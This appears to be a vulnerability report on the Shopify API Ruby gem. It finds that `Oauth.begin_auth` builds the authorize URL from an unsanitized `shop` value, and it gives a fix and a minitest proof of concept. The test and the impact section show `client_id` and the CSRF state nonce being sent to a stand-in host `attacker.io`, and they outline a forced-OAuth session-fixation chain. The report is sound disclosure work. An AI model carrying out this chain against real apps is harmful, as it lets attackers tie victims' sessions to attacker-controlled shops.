### Title
`Oauth.begin_auth` builds the authorize-request destination from an unsanitized `shop` parameter, leaking `client_id` and the CSRF `state` nonce to an attacker-chosen host - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` never calls `ShopValidator.sanitize!`/`sanitize_shop_domain` on the `shop` argument before using it to build the authorize URL, unlike every other credential-issuing flow in this gem (`TokenExchange`, `ClientCredentials`, `RefreshToken`). This confirms the framing in the question: the `redirect_uri` is safe because it is built from the app's trusted `ShopifyAPI::Context.host`, but the authorize-request *destination* — `auth_base_uri(shop)` — is built directly from caller-supplied `shop`, so the binding "host requested == a `ShopValidator`-approved myshopify/shopify.com host" does not hold for that call.

### Finding Description
The claimed binding, stated as an equality: `auth_base_uri(shop)`'s host == a host that `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (or a configured `myshopify_domain`) would accept.

Tracing the code:
- [1](#0-0) `begin_auth(shop:, redirect_path:, ...)` takes `shop` as a raw `String` with no sig-level or explicit domain validation.
- [2](#0-1) `query[:redirect_uri]` is built from `ShopifyAPI::Context.host` (trusted, app-controlled) plus `redirect_path`, while `auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"` is built from the raw `shop`.
- [3](#0-2) `auth_base_uri(shop)` simply returns `"https://#{shop}/admin"` for any shop that doesn't contain `.my.shop.dev` — no call to `ShopValidator` anywhere in this file.
- Compare with the other OAuth entry points, which do sanitize: `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb` all invoke `Utils::ShopValidator.sanitize!` before using `shop`, per the `grep_search` results (`lib/shopify_api/auth/client_credentials.rb`, `lib/shopify_api/auth/refresh_token.rb`, `lib/shopify_api/auth/token_exchange.rb`). `Oauth.begin_auth` is the outlier.
- The documented usage pattern (`docs/usage/oauth.md`, lines 180-199) takes `shop = request.headers["Shop"]` (or a query param, in the general case) straight from the incoming HTTP request and passes it into `begin_auth` with no sanitization step shown or required by the gem's contract.

Attacker request: an unprivileged internet user hits the app's login route with an attacker-controlled `shop` value (e.g. `shop=attacker.io`, or a header/param the app forwards unchanged). The app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.io", redirect_path: "/auth/callback")`. The gem returns `auth_route = "https://attacker.io/admin/oauth/authorize?client_id=...&scope=...&redirect_uri=<trusted-host>/auth/callback&state=<nonce>&grant_options[]=..."` and a `cookie` whose value is that same `state` nonce. The app sets the cookie in the victim's browser and 307-redirects the browser to `auth_route`, i.e., directly to the attacker's server, carrying `client_id` and `state` in the query string.

Why existing guards don't catch this: `HmacValidator.validate` and the `state == auth_query.state` check in `validate_auth_callback` only run on the *callback* path, after Shopify (or an attacker's own shop, since `HMAC` is validated with the real `api_secret_key` on redirects Shopify itself issues) sends the user back; they do nothing to constrain where `begin_auth` sends the user in the first place. `ShopValidator.sanitize!` exists in the codebase and is used by sibling flows, but is simply not invoked here — Sorbet's `sig` only enforces `shop: String`, not domain shape.

### Impact Explanation
Per request, the attacker learns: (1) the app's `client_id` (not secret, low value alone), and (2) the exact `state` nonce that the app just bound to the victim's session cookie. Because the cookie was already set in the victim's browser before the redirect (independent of where the browser is subsequently sent), the attacker now holds a `state` value equal to a live, unexpired CSRF cookie value for that victim's browser. This is a precondition for a session-fixation/forced-OAuth-completion follow-up: the attacker can complete a real, Shopify-signed OAuth authorization on their own development shop using that same `state`, then lure the victim's browser (which still holds the matching cookie) to the app's real callback URL with the attacker's own valid `code`/`hmac`/`state`. `validate_auth_callback` will accept it (cookie state matches, HMAC is genuine), binding the victim's app session to the attacker's shop — a form of forced/foreign session establishment. This matches the rules' High-severity category ("session fixation or forced OAuth completion"); it does not by itself exfiltrate an access token, refresh token, or `client_secret`, so it is not Critical under the given severity taxonomy despite the question's framing. It is repeatable against any victim who can be induced to start login on the vulnerable app once per attack attempt (one nonce per attempt), and does not require any secret.

### Likelihood Explanation
Preconditions: the host app must pass an attacker-influenced `shop` value into `begin_auth` without its own sanitization — which is exactly the pattern shown in this gem's own documentation example (`shop = request.headers["Shop"]`). No special app configuration is needed beyond standard Authorization Code Grant usage (`docs/usage/oauth.md` "Authorization Code Grant" flow). Attacker cost is low: control an HTTP client and a server to receive the redirected browser; also requires setting up a real Shopify development shop to complete the second half of the session-fixation chain, which the rules explicitly permit ("They may create their own development shop, install the app on it..."). Feasibility is high for step one (leaking `state`); the full session-fixation chain requires the extra step of luring the victim back to the real callback URL, which is a realistic but slightly more involved follow-on.

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, validate `shop` the same way the other OAuth flows do before using it to build `auth_base_uri`:
```ruby
def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
  shop = Utils::ShopValidator.sanitize!(shop)
  ...
```
This ensures `auth_base_uri(shop)` can only ever target `TRUSTED_SHOPIFY_DOMAINS` (or a configured `myshopify_domain`), closing the gap between the authorize-request destination and the destination `ShopValidator` would accept, consistent with `TokenExchange`, `ClientCredentials`, and `RefreshToken`.

### Proof of Concept
Add to `test/auth/oauth_test.rb` (minitest, no live shop / no WebMock needed since `begin_auth` never makes an HTTP call):

```ruby
def test_begin_auth_sends_client_id_and_state_to_unsanitized_shop_host
  result = ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.io", redirect_path: "/auth/callback")

  auth_route = result[:auth_route]
  cookie_value = result[:cookie].value

  # Destination host equality check (the binding the question asks about):
  assert auth_route.start_with?("https://attacker.io/admin/oauth/authorize?"),
    "authorize request was sent to attacker-controlled host instead of a ShopValidator-trusted domain"

  parsed_state = URI.decode_www_form(URI.parse(auth_route).query).to_h["state"]
  assert_equal cookie_value, parsed_state,
    "attacker-controlled host receives the exact state nonce bound to the victim's session cookie"

  # redirect_uri remains safe/trusted, confirming it is NOT the broken binding:
  redirect_uri = URI.decode_www_form(URI.parse(auth_route).query).to_h["redirect_uri"]
  assert_equal "#{ShopifyAPI::Context.host}/auth/callback", redirect_uri
end
```
This demonstrates both halves of the question's claim: `redirect_uri` stays bound to `ShopifyAPI::Context.host` (safe), while the authorize GET target (`auth_route`'s host) is not bound to any `ShopValidator`-approved domain and instead reflects the raw, attacker-supplied `shop`, carrying `client_id` and the CSRF `state` to that host. [2](#0-1) [3](#0-2)

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L22-22)
```ruby
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
```

**File:** lib/shopify_api/auth/oauth.rb (L40-49)
```ruby
          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"
```

**File:** lib/shopify_api/auth/oauth.rb (L117-119)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
```
